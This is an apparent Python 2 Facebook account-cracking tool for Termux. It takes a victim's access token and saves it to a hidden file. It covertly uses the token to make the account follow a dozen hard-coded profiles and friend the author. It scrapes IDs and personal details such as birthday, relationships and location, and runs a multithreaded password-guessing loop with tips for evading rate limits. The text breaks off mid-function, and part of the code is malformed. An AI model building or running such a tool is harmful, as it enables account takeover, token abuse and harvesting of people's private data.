#!/usr/bin/python2
# coding=utf-8
# Coded By ALI RAZA
# My Facebook Page ( AR TERMUX TRICK

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Ali Raza.

import os
try:
    import requests
except ImportError:
    print '\n [×] Modul requests belum terinstall!...\n'
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [×] Modul Futures belum terinstall!...\n'
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    print '\n [×] Modul Bs4 belum terinstall!...\n'
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  ALI RAZA.  #
#------------------------------->
koh = '100005395413800'
xi_jimpinx = '1714000985456399'
ok, cp, id, loop = [], [], [], 0
hoetank = random.choice(['The person who posted is handsome:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {"01": "jan", "02": "feb", "03": "mar", "04": "apr", "05": "may", "06": "jun", "07": "jul", "08": "aug", "09": "sep", "10": "oct", "11": "nov", "12": "dec"}

# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Token Deletes %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)

# LO KONTOL
logo = ''' \033[0;96m   ___    ___    ____   
 \033[0;96m  / \x1b[1;93m® \033[0m| Created By ALI RAZA
 \033[1;93m /  \033[0m| Github.com/aliraza
 \033[1;93m/ \033[0;91mv2.0 \033[0m| Yt:Technical raza

░█████╗░██╗░░░░░██╗
██╔══██╗██║░░░░░██║
███████║██║░░░░░██║
██╔══██║██║░░░░░██║
██║░░██║███████╗██║
╚═╝░░╚═╝╚══════╝╚═╝

██████╗░░█████╗░███████╗░█████╗░
██╔══██╗██╔══██╗╚════██║██╔══██╗
██████╔╝███████║░░███╔═╝███████║
██╔══██╗██╔══██║██╔══╝░░██╔══██║
██║░░██║██║░░██║███████╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

lo_ngentod = '1714009362122228'
# crack complete
def Total(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n %s[%s#%s] crack done dear...'%(N,K,N)
        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
    else:
        print '\n\n [%s!%s] opshh you are not getting results :('%(M,N);exit()

#masuk token
def yayanxd():
    os.system('clear')
    print ('%s╔══[%s LOGIN WITH FRESH TOKEN \n%s╠══[%s Do you know how to get facebook tokens?'%(O,N,O,N,O,N,H,N))
    print ('%s║%s '%(O,N))
    kontol = raw_input('%s%s╚══[?]%s Put Token :%s '%(N,M,N,H))
    if kontol in ('open', 'Open', 'OPEN'):
        print '\n%s *%s note! try the victimized account login on google chrome first'%(B,N);time.sleep(2)
        print '%s *%s do not forget! url change to %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
        print '%s *%s After Switching to Chrome. Click %3 Dots'%(B,N,H);time.sleep(2)
        print '%s *%s then click %sSearch on page%s Just type %sEAA%s Then copy.'%(B,N,H,N,H,N);time.sleep(2)
        raw_input(' %s*%s Press enter '%(O,N))
        os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
        yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
        print '%s║%s '%(O,N)
        print '%s╠══[%s Welcome%s%s%s Bro\033[0;96m]'%(O,N,H,nama,N);time.sleep(2)
        print '%s╠══[%s Before Using This Script Please On/Off Airplane mode\033[0;96m]'%(O,N);time.sleep(2)
        print '%s╠══[%s Subsceibe My channel Technical Raza:v \033[0;96m]'%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input('\n%s[•]%s Press Enter '%(O,N));wuhan(kontol)
        os.system('xdg-https://youtube.com/channel/UCO97zzdSWPQ62TS861GLCgw/')
        moch_yayan()
    except KeyError:
        print '\n\n%s[%s!%s] Token Invalid'%(N,M,N);time.sleep(2);yayanxd()

### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
    	kontol = open('.memek.txt', 'r').read()
    except IOError:
        print '\n%s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
        print '\n%s[%s×%s] Token Invalid'%(N,M,N);time.sleep(2);os.system('rm -rf .memek.txt');yayanxd()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s!%s] no connection\n'%(N,M,N))
    os.system('clear')
    print logo
    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
    print '%s╔══════════════════════════════════════════════════%s'%(O,N)
    print '\033[0;96m╠══[\033[0;97m YOUR NAME : %s'%(nama);time.sleep(0.04)
    print '\033[0;96m╠══[\033[0;97m YOUR IP   : %s'%(IP);time.sleep(0.04)
    print '%s╠══════════════════════════════════════════════════%s'%(O,N)
    print '%s╠══[1]%s \033[0;93mDump id \033[0;97mFrom Friend \033[0;96m[\033[0;93m5000\033[0;96m]'%(O,N);time.sleep(0.04)
    print '\033[0;97m%s╠══[2]%s \033[0;93mDump id \033[0;97mFrom Public ID \033[0;96m[\033[0;93m5000\033[0;96m]'%(O,N);time.sleep(0.04)
    print '\033[0;97m%s╠══[3]%s \033[0;93mDump id \033[0;97mFrom Followers \033[0;96m[\033[0;93m5000\033[0;96m]'%(O,N);time.sleep(0.04)
    print '\033[0;97m%s╠══[4]%s \033[0;93mDump id \033[0;97mFrom Post Likes \033[0;96m[\033[0;93m5000\033[0;96m]'%(O,N);time.sleep(0.04)
    print '\033[0;97m%s╠══[5]%s Start \033[0;93mCrack Facebook'%(O,N);time.sleep(0.04)
    print '%s╠══[6]%s Check information \033[0;93maccount facebook'%(O,N);time.sleep(0.04)
    print '%s╠══[7]%s View results \033[0;93mcrack \033[0;97mIDs'%(O,N);time.sleep(0.04)
    print '%s╠══[8]%s Setting \033[0;93muser agent'%(O,N);time.sleep(0.04)
    print '%s╠══[9]%s Information %sSC%s'%(O,N,O,N);time.sleep(0.04)
    print '%s╠══[0]%s Log Out \033[0;96m[%sAhh Down%s\033[0;96m]'%(O,N,K,N);time.sleep(0.04)
    print '%s║%s'%(O,N);time.sleep(0.04)
    pepek = raw_input('\033[0;96m╚══[•] \033[0;97mMenu : ')
    if pepek == '':
        print '%s%s╚══[%s Select Any Option! ]'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['1','01']:
        teman(kontol)
    elif pepek in['2','02']:
        publik(kontol)
    elif pepek in['3','03']:
        followers(kontol)
    elif pepek in['4','04']:
        postingan(kontol)
    elif pepek in['5','05']:
        __crack__().plerr()
    elif pepek in['6','06']:
        cek_ingfo(kontol)
    elif pepek in['7','07']:
        try:
            dirs = os.listdir("results")
            print '\n╔══[ crack results stored in your file ]'
            for file in dirs:
                print("%s╠══[%s %s"%(O,N,file))
            file = raw_input("╠══[%s•%s] Enter file Nams :%s "%(M,N,H))
            if file == "":
                file = raw_input("%s╠══[%s•%s] Enter file name :%s %s"%(N,M,N,H,N))
            total = open("results/%s"%(file)).read().splitlines()
            print("%s%s╠%s═════════════════════════════════════════════════════════"%(N,O,N));time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jalan("%s╠[%s Total %scrack%s On Acc %s:%s%s%s total %s: %s%s%s "%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
            print("%s%s╠%s═════════════════════════════════════════════════════════"%(N,O,N));time.sleep(2)
            for memek in total:
            	kontol = memek.replace("\n","")
                titid  = kontol.replace("[✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" ╠ ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print("%s%s╠%s═════════════════════════════════════════════════════════"%(N,O,N));time.sleep(2)
            raw_input('%s╚══[%s RETURN ] '%(O,N));moch_yayan()
        except (IOError):
            print("\n%s[%s!%s] opshh you are not getting results"%(N,K,N))
            raw_input('%s╚══[%s RETURN%s ] '%(O,N));moch_yayan()
    elif pepek in['8','08']:
        seting_yntkts()
    elif pepek in['9','09']:
        info_tools()
    elif pepek in['0','00']:
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .memek.txt')
        jalan('\n %s[%s✓%s]%s successfully deleted token'%(N,H,N,H));exit()
    else:
        print '\n %s[%s×%s] menu [%s%s%s] no, check the menu bro!'%(N,M,N,M,pepek,N);time.sleep(2);moch_yayan()

# Yang ganti bot nya gw sumpahin mak lo mati ajg!
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
    except:
    	pass

# dumpid of friend 
def teman(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n%s%s╔══[%s Name File  : '%(N,O,N))
        asw = raw_input('%s%s╚══[%s Limit id   : '%(N,O,N))
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        xxx = open(cin, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            id.append(a['name'] + '<=>' + a['id'])
            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        xxx.close()
        jalan('\n\n%s[%s✓%s] successfully dump id from friend'%(N,H,N))
        print '[%s•%s] copy output file 👉 ( %s%s%s )'%(O,N,H,cin,N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n%s[%s!%s] Id dump failed, maybe the id is not public.\n'%(N,M,N))
        raw_input('[ %sRETURN%s ] '%(O,N));moch_yayan()
'''csy = 'Cindy sayang Yayan'
ysc = 'Yayan sayang Cindy''''
# dump id of public friend 
def publik(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔══[%s Public id  : '%(N,O,N))
        ahh = raw_input('%s%s╠══[%s Name File  : '%(N,O,N))
        ihh = raw_input('%s%s╚══[%s Limit id   : '%(N,O,N))
        knt = ('dump/' + ahh + '.json').replace(' ', '_')
        ys  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n[\033[0;96m%s\033[0m] [\033[0;92m%s\033[0m] Wait, Dump Id process has been start'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0030)

        ys.close()
        jalan('\n\n%s[%s✓%s] Success dump public ID'%(N,H,N))
        print '[%s•%s] copy output file 👉 ( %s%s%s )'%(O,N,H,knt,N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n%s[%s!%s] Failed to dump id, probably id is not public.\n'%(N,M,N))
        raw_input('[ %sRETURN%s ] '%(O,N));moch_yayan()

# dump id From followers 
def followers(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔══[%s Id Followers  : '%(N,O,N))
        mmk = raw_input('%s%s╠══[%s Name File  : '%(N,O,N))
        asw = raw_input('%s%s╚══[%s Limit Id   : '%(N,O,N))
        ah  = ('dump/' + mmk + '.json').replace(' ', '_')
        ys  = open(ah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n[\033[0;96m%s\033[0m] [\033[0;92m%s\033[0m] Wait, Dump Id'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0030)

        ys.close()
        jalan('\n\n%s[%s✓%s] successfully dump id from total followers'%(N,H,N))
        print '[%s•%s] copy output file 👉 ( %s%s%s )'%(O,N,H,ah,N)
        print 50 * '-'
        raw_input('[%s Press ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ah)
        jalan('\n%s[%s!%s] Failed to dump id, probably id is not public.\n'%(N,M,N))
        raw_input('[ %sRETURN%s ] '%(O,N));moch_yayan()

# dump id Feom posts
def postingan(kontol):
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n%s%s╔══[%s Posts Id : '%(N,O,N))
        ppk = raw_input('%s%s╠══[%s Name File  : '%(N,O,N))
        asw = raw_input('%s%s╚══[%s Limit Id   : '%(N,O,N))
        ahh = ('dump/' + ppk + '.json').replace(' ', '_')
        ys  = open(ahh, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n[\033[0;96m%s\033[0m] [\033[0;92m%s\033[0m] Wait, Dump Id'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0030)

        ys.close()
        jalan('\n\n%s[%s✓%s] successfully dump id from like post'%(N,H,N))
        print '[%s•%s] copy output file 👉 ( %s%s%s )'%(O,N,H,ahh,N)
        print 50 * '-'
        raw_input('[%s PRESS ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(ahh)
        jalan('\n%s[%s!%s] Failed to dump id, probably id is not public.\n'%(N,M,N))
        raw_input('[ %sRETURN%s ] '%(O,N));moch_yayan()

#check info
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] enter id or username : "%(O,N))
        if user == '':
            print "\n [%s!%s] Fill Empty Place bro"%(M,N);cek_ingfo(kontol)
        url = ("https://lookup-id.com/")
        if "facebook" in user:
            payload = {"fburl": user, "check": "Lookup"}
        else:
            payload = {"fburl": "https://free.facebook.com/" + user, "check": "Lookup"}
        halaman = requests.post(url, data = payload).text.encode("utf-8")
        sop_ = BeautifulSoup(halaman, "html.parser")
        email_ = sop_.find("span", id = "code")
        idt = email_.text
        if user == "me":
            idt = "me"
        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, kontol)).json()
        nmaa = x['name']
    except (KeyError, IOError):
        nmaa = '%s-%s'%(M,N)
    print '\n  * Information Facebook Account *';time.sleep(0.03)
    print '\n [*] full name : %s'%(nmaa);time.sleep(0.03)
    try:
    	ndpn = x['first_name']
    except (KeyError, IOError):
    	ndpn = '%s-%s'%(M,N)
    print ' [*] First Name   : %s'%(ndpn);time.sleep(0.03)
    try:
    	nmbl = x['last_name']
    except (KeyError, IOError):
    	nmbl = '%s-%s'%(M,N)
    print ' [*] Last name: %s'%(nmbl);time.sleep(0.03)
    try:
    	hwhs = x['username']
    except (KeyError, IOError):
    	hwhs = '%s-%s'%(M,N)
    print ' [*] username fb  : %s'%(hwhs);time.sleep(0.03)
    try:
    	asu = x['id']
    except (KeyError, IOError):
    	asu = '%s-%s'%(M,N)
    print ' [*] id facebook  : %s'%(asu);time.sleep(0.03)
    print '\n  * data-data facebook account *\n';time.sleep(0.03)
    try:
    	emai = x['email']
    except (KeyError, IOError):
    	emai = '%s-%s'%(M,N)
    print ' [*] gmail facebook : %s'%(emai);time.sleep(0.03)
    try:
    	nmrr = x['mobile_phone']
    except (KeyError, IOError):
    	nmrr = '%s-%s'%(M,N)
    print ' [*] Mobile Number  : %s'%(nmrr);time.sleep(0.03)
    try:
    	ttll = x['birthday']
        month, day, year = ttll.split("/")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
        year = '%s-%s'%(M,N)
    print ' [*] date of birth  : %s %s %s '%(day,month,year);time.sleep(0.03)
    try:
    	jenis = x['gender'].replace("female", "Female").replace("male", "Male")
    except (KeyError, IOError):
    	jenis = ''
    print ' [*] gender  : %s '%(jenis)
    try:
    	r = requests.get('https://graph.facebook.com/%s/friends?limit=50000&access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    except:pass
    print ' [*] number of friends  : %s'%str(len(id));time.sleep(0.03)
    try:
    	r = requests.get('https://graph.facebook.com/%s/subscribers?access_token=%s'%(idt, kontol))
        z = json.loads(r.text)
        pengikut = z['summary']['total_count']
    except (KeyError, IOError):
    	pengikut = '%s-%s'%(M,N)
    print ' [*] total followers: %s'%(pengikut);time.sleep(0.03)
    try:
    	lins = x['link']
    except (KeyError, IOError):
    	lins = '%s-%s'%(M,N)
    print ' [*] link facebook  : %s'%(lins);time.sleep(0.03)
    try:
    	stas = x['relationship_status']
    except (KeyError, IOError):
    	stas = '%s-%s'%(M,N)
    try:
    	dgn = '''with %s'''%(x['significant_other']['name'])
    except (KeyError, IOError):
    	dgn = '%s-%s'%(M,N)
    except: pass
    print ' [*] relationship status: %s %s'%(stas,dgn);time.sleep(0.03)
    try:
    	bioo = x['about']
    except (KeyError, IOError):
    	bioo = '%s-%s'%(M,N)
    except: pass
    print ' [*] about status : %s'%(bioo);time.sleep(0.03)
    try:
    	dari = x['hometown']['name']
    except (KeyError, IOError):
    	dari = '%s-%s'%(M,N)
    except: pass
    print ' [*] hometown      : %s'%(dari);time.sleep(0.03)
    try:
    	tigl = x['location']['name']
    except (KeyError, IOError):
    	tigl = '%s-%s'%(M,N)
    except: pass
    print ' [*] stay in     : %s'%(tigl);time.sleep(0.03)
    try:
    	tzim = x['timezone']
    except (KeyError, IOError):
    	tzim = '%s-%s'%(M,N)
    except: pass
    print ' [*] Time Zone    : %s'%(tzim);time.sleep(0.03)
    try:
    	jam  = x['updated_time'][11:19]
    	uptd = x['updated_time'][:10]
        year, month, day = uptd.split("-")
        month = bulan_ttl[month]
    except (KeyError, IOError):
    	year = '%s-%s'%(M,N)
        month = '%s-%s'%(M,N)
        day = '%s-%s'%(M,N)
    except:pass
    print ' [*] last updated on %s month %s year %s Time %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] Success manage data² Account facebook\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] Fb page      : ar termux trick (Handsome People Hehe)'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Author   : ALIRAZA.'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Github   : https://github.com/aliraza'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] Yt : Technical raza/'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] watsapp: 03047269778'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] TEAM PROJECT XNX-CODE 2022'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] • ALI raza (YumasaaTzy)'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Mr cute'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Hussaini Raza'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Teekhi mirchi'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Kitto (Dumai-991)'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] INFO USAGE SCRIPT :'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.09)
    print '%s[%s>%s] • First We Have to Dump Id First'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Choose Numbers 1 To 4 For Dump Id'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Try the Total Theme Target 1500'%(N,H,N);time.sleep(0.09)  
    print '%s[%s>%s] • Limit Id Write Only 5000'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • If You Have, Choose Number 5 To Start Cracking'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Enable Airplane Mode 5 Seconds After Every 5 Minutes'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Contact Me If you Have Problem Lino Below'%(N,H,N);time.sleep(0.09)
    print '%s[%s>%s] • Fb page : Ar termux trick'%(N,H,N);time.sleep(0.09)
    print '%s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
    raw_input('\n[ %sReturn%s ] '%(O,N));moch_yayan()

### Change user agent
def seting_yntkts():
    print '\n[%s1%s] Change user agent'%(O,N)
    print '[%s2%s] Check user agent'%(O,N)
    ytbjts = raw_input('\n%s[%s?%s] menu : '%(N,O,N))
    if ytbjts == '':
        print '\n%s[%s×%s] Fill Empty Places'%(N,M,N);time.sleep(2);seting_yntkts()
    elif ytbjts =='1':
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts =='2':
        check_yntkts()
    else:
        print '\n%s[%s×%s] correct input'%(N,M,N);time.sleep(2);seting_yntkts()

# User Agent new
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf YNTKTS.txt')
    print '\n%s[%s•%s] Note: Find User Agent in Google Chrome'%(N,O,N)
    print '[%s•%s] Ketik Type User Agent Or My User Agent....'%(M,N)
    anjng = raw_input('[%s?%s] Input User Agent :%s '%(O,N,H))
    if anjng == '':
        print '\n%s[%s×%s] Fill empty places'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
        open('YNTKTS.txt', 'w').write(anjng);time.sleep(2)
        jalan('\n%s[%s✓%s] success Change User Agent'%(N,H,N))
        raw_input('%s[ %sRETURN%s ]'%(N,H,N));moch_yayan()
    except:pass

# Check User Agent
def check_yntkts():
    try:
        user_agent = open('YNTKTS.txt', 'r').read()
    except IOError:
    	user_agent = '%sMozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'%(H)
    except: pass
    print '\n%s[%s•%s] User Agent You Are Now : %s%s'%(N,O,N,H,user_agent)
    raw_input('\n%s[ %sRETURN%s ]'%(N,H,N));moch_yayan()
   
# start squishing awokawokawokkawok
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n%s╔══[?]%s Input File Dump :\033[0;93m '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '%s╠══[•]%s Total Id -> %s%s%s' %(O,N,H,len(self.id),N)
        except:
            print '%s╠══[%s×%s] File [%s%s%s] there is not any file'%(N,M,N,M,self.apk,N);time.sleep(2)
            raw_input('%s╚══[ %sRETURN%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input('%s╚══[?]%s want to use \033[0;93mpassword \033[0;97mmanual? [y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n%s%s╔══[%s Use \033[0;92mcomma \033[0;97mfor password separator \033[0;96m]'%(N,O,N,)
            print '%s║%s '%(O,N)
            while True:
                pwek = raw_input('%s╠══[?]%s Enter password : \033[0;93m'%(O,N))
                print '\033[0;96m╠══[•] \033[0;97mCrack with password [%s%s%s]' % (H, pwek, N)
                if pwek == '':
                    print '%s[%s×%s] Fill Empty Place kentod'%(N,M,N)
                elif len(pwek)<=5:
                    print '%s[%s×%s] password minimum 6 characters'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Ali raza:3
                        cin = raw_input('\033[0;96m╠══[?] \033[0;97mMethod : ')
                        print '%s║%s '%(O,N)
                        if cin == '':
                            print '%s[%s×%s] Fill Empty Place'%(N,M,N);self.__yan__()
                            print '%s║%s '%(O,N)
                        elif cin == '1':
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mUse airplane mode for 5 sec\n'%(H,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                            print '%s║%s '%(O,N)
                        elif cin == '2':
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╚══[%s!%s\033[0;96m] \033[0;97mUse airplane mode for 5 sec\n'%(H,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
                            
                            os.remove(self.apk)
                            hasil(ok,cp)
                            print '%s║%s '%(O,N)
                        elif cin == '3':
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount OK Saved In > Results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\033[0;96m╠══[%s•%s\033[0;96m] \033[0;97mAccount CP Saved In > Results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
